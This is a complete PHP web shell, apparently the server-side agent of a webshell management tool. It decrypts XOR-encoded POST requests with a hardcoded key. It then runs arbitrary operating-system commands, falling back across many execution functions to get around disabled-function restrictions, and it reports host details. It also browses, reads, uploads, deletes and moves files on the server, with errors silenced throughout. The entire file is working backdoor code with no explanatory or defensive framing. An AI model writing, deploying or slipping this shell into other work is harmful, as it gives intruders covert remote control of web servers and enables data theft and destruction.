<?php
@set_time_limit(0);
@error_reporting(0);
function xor_enc($D,$K){for($i=0;$i<strlen($D);$i++){$D[$i]=$D[$i]^$K[($i+1)&15];}return $D;}
function parseParams($d){$p=array();$i=0;$l=strlen($d);while($i<$l){$kl=ord($d[$i]);$i++;if($i+$kl>$l)break;$k=substr($d,$i,$kl);$i+=$kl;if($i+4>$l)break;$vl=(ord($d[$i])<<24)|(ord($d[$i+1])<<16)|(ord($d[$i+2])<<8)|ord($d[$i+3]);$i+=4;if($i+$vl>$l)break;$p[$k]=substr($d,$i,$vl);$i+=$vl;}return $p;}
$key='3c6e0b8a9c15224a';
$raw=file_get_contents("php://input");
if(strlen($raw)>0){
    $data=xor_enc($raw,$key);
    $params=parseParams($data);
    $method=isset($params['methodName'])?$params['methodName']:'';
    $result='';
    $isWin=strtoupper(substr(PHP_OS,0,3))==='WIN';
    switch($method){
        case 'test':$result='ok';break;
        case 'getBasicsInfo':
            $os=(function_exists('php_uname')&&is_callable('php_uname'))?@php_uname():'N/A';
            $user=(function_exists('get_current_user')&&is_callable('get_current_user'))?@get_current_user():'N/A';
            $cwd='N/A';if(function_exists('getcwd')&&is_callable('getcwd')){$c=@getcwd();if($c!==false)$cwd=str_replace('\\','/',$c);}
            $root=$isWin?'C:/;D:/;E:/':'/';
            $tmp='N/A';if(function_exists('sys_get_temp_dir')&&is_callable('sys_get_temp_dir')){$t=@sys_get_temp_dir();if($t!==false)$tmp=str_replace('\\','/',$t);}
            $arch=PHP_INT_SIZE==8?'x64':'x86';
            $phpver=phpversion();
            $disable=@ini_get('disable_functions');if($disable===false)$disable='';
            $openbase=@ini_get('open_basedir');if($openbase===false)$openbase='';
            $server=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'';
            $serverip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:(isset($_SERVER['LOCAL_ADDR'])?$_SERVER['LOCAL_ADDR']:'');
            $result="FileRoot : {$root}\nCurrentDir : {$cwd}\nOsInfo : {$os}\nCurrentUser : {$user}\nProcessArch : {$arch}\nsystempdir : {$tmp}\nPHPVersion : {$phpver}\nDisableFunctions : {$disable}\nOpenBasedir : {$openbase}\nServerSoftware : {$server}\nServerIP : {$serverip}\n";
            break;
        case 'execCommand':
            $cmd=isset($params['cmdLine'])?$params['cmdLine']:'';
            $result='';
            while(@ob_get_level()>0)@ob_end_clean();
            if($isWin){@putenv("PATH=".@getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows");}
            else{@putenv("PATH=".@getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}
            // 获取禁用函数列表
            $dis=','.str_replace(' ','',strtolower(@ini_get("disable_functions"))).',';
            // 按优先级尝试 (直接检查，不定义函数)
            if(strpos($dis,',system,')===false&&function_exists('system')){@ob_start();@system($cmd);$result=@ob_get_contents();@ob_end_clean();}
            elseif(strpos($dis,',passthru,')===false&&function_exists('passthru')){@ob_start();@passthru($cmd);$result=@ob_get_contents();@ob_end_clean();}
            elseif(strpos($dis,',shell_exec,')===false&&function_exists('shell_exec')){$result=@shell_exec($cmd);}
            elseif(strpos($dis,',exec,')===false&&function_exists('exec')){$o=array();@exec($cmd,$o);$result=implode("\n",$o);}
            elseif(strpos($dis,',popen,')===false&&function_exists('popen')){$fp=@popen($cmd,'r');if($fp){while(!@feof($fp))$result.=@fgets($fp,1024);@pclose($fp);}}
            elseif(strpos($dis,',proc_open,')===false&&function_exists('proc_open')){$p=@proc_open($cmd,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);if($p){while(!@feof($io[1]))$result.=@fgets($io[1],1024);while(!@feof($io[2]))$result.=@fgets($io[2],1024);@fclose($io[1]);@fclose($io[2]);@proc_close($p);}}
            elseif($isWin&&class_exists('COM')){$w=new COM('WScript.Shell');$e=$w->Exec('cmd /c '.$cmd);$so=$e->StdOut();$se=$e->StdErr();$result=$so->ReadAll().$se->ReadAll();}
            elseif(strpos($dis,',pcntl_fork,')===false&&strpos($dis,',pcntl_exec,')===false&&function_exists('pcntl_fork')&&function_exists('pcntl_exec')){$sh="/bin/bash";if(!file_exists($sh))$sh="/bin/sh";$rf=sys_get_temp_dir()."/".(time()+1).".log";switch(pcntl_fork()){case 0:pcntl_exec($sh,array("-c","$cmd > $rf 2>&1"));exit(0);default:break;}if(!file_exists($rf))sleep(2);$result=@file_get_contents($rf);@unlink($rf);}
            else{$result='No available command execution method';}
            break;
        case 'getFile':
            $dir=isset($params['dirName'])?$params['dirName']:'.';
            $dir=str_replace('\\','/',$dir);$files=@scandir($dir);
            if($files){foreach($files as $f){if($f=='.'||$f=='..')continue;$p=rtrim($dir,'/').'/'.$f;$d=is_dir($p)?'1':'0';$s=$d=='1'?0:@filesize($p);$m=@date('Y-m-d H:i:s',@filemtime($p));$pm=@substr(sprintf('%o',@fileperms($p)),-4);$result.="{$f}\t{$s}\t{$m}\t{$pm}\t{$d}\n";}}
            break;
        case 'readFileContent':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $result=@file_get_contents($fn);if($result===false)$result='';
            break;
        case 'uploadFile':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $fc=isset($params['fileValue'])?$params['fileValue']:'';
            $result=@file_put_contents($fn,$fc)!==false?'ok':'fail';
            break;
        case 'deleteFile':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $result=is_dir($fn)?(@rmdir($fn)?'ok':'fail'):(@unlink($fn)?'ok':'fail');
            break;
        case 'newFile':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $result=@file_put_contents($fn,'')!==false?'ok':'fail';
            break;
        case 'newDir':
            $dn=isset($params['dirName'])?$params['dirName']:'';
            $result=@mkdir($dn,0755,true)?'ok':'fail';
            break;
        case 'copyFile':
            $src=isset($params['srcFileName'])?$params['srcFileName']:'';
            $dst=isset($params['destFileName'])?$params['destFileName']:'';
            $result=@copy($src,$dst)?'ok':'fail';
            break;
        case 'moveFile':
            $src=isset($params['srcFileName'])?$params['srcFileName']:'';
            $dst=isset($params['destFileName'])?$params['destFileName']:'';
            $result=@rename($src,$dst)?'ok':'fail';
            break;
        case 'bigFileDownload':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $mode=isset($params['mode'])?$params['mode']:'read';
            if($mode=='fileSize'){$result=file_exists($fn)?@filesize($fn):'-1';}
            else{$pos=isset($params['position'])?intval($params['position']):0;$num=isset($params['readByteNum'])?intval($params['readByteNum']):1024;if(file_exists($fn)){$fp=@fopen($fn,'rb');if($fp){@fseek($fp,$pos);$result=@fread($fp,$num);@fclose($fp);}}}
            break;
        case 'bigFileUpload':
            $fn=isset($params['fileName'])?$params['fileName']:'';
            $pos=isset($params['position'])?intval($params['position']):0;
            $fc=isset($params['fileContents'])?$params['fileContents']:'';
            if(!empty($fn)){$fp=@fopen($fn,'c+b');if($fp){@fseek($fp,$pos);@fwrite($fp,$fc);@fclose($fp);$result='ok';}else{$result='fail';}}
            break;
        case 'g_close':$result='ok';break;
        default:$result='unknown:'.$method;
    }
    echo xor_enc($result,$key);
}
?>